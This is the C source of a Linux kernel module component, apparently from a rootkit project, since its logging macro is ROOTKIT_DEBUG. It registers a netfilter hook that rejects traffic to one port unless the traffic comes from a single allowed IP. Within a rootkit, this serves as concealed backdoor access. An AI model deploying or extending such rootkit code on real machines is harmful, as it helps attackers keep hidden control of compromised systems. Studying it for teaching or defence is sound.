/*
 * This file provides all the functionality needed for port knocking.
 */
#include <linux/inet.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <net/icmp.h>
#include <net/ip.h>
#include <net/netfilter/ipv4/nf_reject.h>

#include "include.h"
#include "port_knocking.h"

/* information for netfilter hooks */
static struct nf_hook_ops hook;

/* the port for which knocking is enabled */
static unsigned int port;

/* the transport layer protocol being filtered */
static int protocol;

/* the ip address which is allowed to connect */
static __u32 ip;

/* 
 * This function does all the checking.
 * First it checks if the packet is on one of the blocked ports. If this is
 * the case, it further checks whether the packet received is from the allowed ip.
 * If this is the case (or it belongs to an unblocked port), then it returns
 * false (let through), otherwise it returns true (drop and reject).
 */
static int
is_port_blocked (struct sk_buff *skb) {

	struct iphdr *ip_header = (struct iphdr *) skb_network_header(skb);
	struct tcphdr *tcp_header;
	struct udphdr *udp_header;

	/* check tree for TCP */
	if (protocol == PROTO_TCP 
		&& ip_header->protocol == 6) {

		/* get the tcp header */
		tcp_header = (struct tcphdr *) skb_transport_header(skb);
		
		/* check if the port matches */
		if(ntohs(tcp_header->dest) == port) {
			ROOTKIT_DEBUG("Received packet on filtered tcp port %u from IP %pI4.\n",
				port, &ip_header->saddr);
			
			/* check if the ip matches */
			if(ntohl(ip_header->saddr) == ip) {

				return 0;	/* allow it */

			} else {
				
				return 1;	/* reject it */

			}
			
		}
	}

	/* check tree for UDP */
	if (protocol == PROTO_UDP
		&& ip_header->protocol == 17) {

		/* get the udp header */
		udp_header = (struct udphdr *) skb_transport_header(skb);

		/* check if the port matches */
		if(ntohs(udp_header->dest) == port) {
			ROOTKIT_DEBUG("Received packet on filtered udp port %u from IP %pI4.\n",
				port, &ip_header->saddr);
			
			/* check if the ip matches */
			if(ntohl(ip_header->saddr) == ip) {

				return 0;	/* allow it */

			} else {

				return 1;	/* reject it */

			}
			
		}
	}

	return 0;	/* allow it */
}

/* 
 * The Netfilter hook function.
 * It is of type nf_hookfn (see netfilter.h).
 *
 * 
 */
unsigned int
knocking_hook (const struct nf_hook_ops *ops,
	struct sk_buff *skb,
	const struct net_device *in,
	const struct net_device *out,
	int (*okfn)(struct sk_buff *))
{
	struct iphdr *ip_header = (struct iphdr *) skb_network_header(skb);
	
	/* check if we need to block this packet */
	if(is_port_blocked(skb)) {

		/* 
		 * craft an appropriate REJECT response
		 */
		if(ip_header->protocol == 6) {	/* tcp */
			nf_send_reset(skb, ops->hooknum);	/* send TCP RST */
		}
		
		if(ip_header->protocol == 17) {	/* udp */
			nf_send_unreach(skb, 3);		/* send icmp port unreachable */
		}

		/* we can now safely drop the packet */
		ROOTKIT_DEBUG("Dropped a packet due to port knocking.\n");
		return NF_DROP;

	} else {

		/* let the packet through */
		return NF_ACCEPT;

	}

}

/* enable port knocking */
int
load_port_knocking (char *ipv4_addr, unsigned int port_number, int proto)
{
	int ret;
	u8 tmp[4];
	
	ROOTKIT_DEBUG("Starting to load the port knocking...\n");
	
	/* convert ip string to an int array */
	in4_pton(ipv4_addr, -1, tmp, -1, NULL);
	ip = 0;

	/* hack to convert byte array to __u32 */
	ip |= tmp[0] & 0xFF;
	ip <<= 8;
	ip |= tmp[1] & 0xFF;
	ip <<= 8;
	ip |= tmp[2] & 0xFF;
	ip <<= 8;
	ip |= tmp[3] & 0xFF;

	/* copy the port number */
	port = port_number;

	/* copy the protocol */
	protocol = proto;

	/* setup everything for the netfilter hook */
	hook.hook = knocking_hook;		/* our function */
	hook.hooknum = NF_INET_LOCAL_IN;	/* grab everything that comes in */
	hook.pf = PF_INET; 			/* we only care about ipv4 */
	hook.priority = NF_IP_PRI_FIRST;	/* respect my prioritah */

	/* actually do the hook */
	ret = nf_register_hook(&hook);

	if(ret < 0) {
		ROOTKIT_DEBUG("Error enabling port knocking. Return of nf_register_hook = %d\n", ret);
		return ret;
	}

	/* log our success */
	ROOTKIT_DEBUG("Done.\n");
	return 0;
}

/* disable port knocking */
void
unload_port_knocking (void)
{
	ROOTKIT_DEBUG("Starting to unload the port knocking...\n");

	/* unregister the netfilter hook */
	nf_unregister_hook(&hook);

	ROOTKIT_DEBUG("Done.\n");
}
